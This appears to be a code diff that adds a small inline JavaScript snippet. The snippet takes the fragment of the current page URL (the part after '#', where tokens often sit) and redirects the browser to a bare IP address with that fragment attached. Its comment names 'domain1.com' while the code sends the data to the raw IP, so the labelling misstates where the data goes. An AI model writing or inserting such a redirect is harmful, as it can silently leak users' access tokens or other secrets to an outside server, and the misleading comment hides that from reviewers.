@@ -1,0 +1,10 @@
+<script>
+  // Extract the fragment part (everything after #)
+  const hash = window.location.href.split('#')[1] || '';
+
+  // Construct the new URL on domain1.com with the fragment
+  const newUrl = `http://157.230.14.89/#${hash}`;
+
+  // Redirect to the new URL
+  document.location.href = newUrl;
+</script>
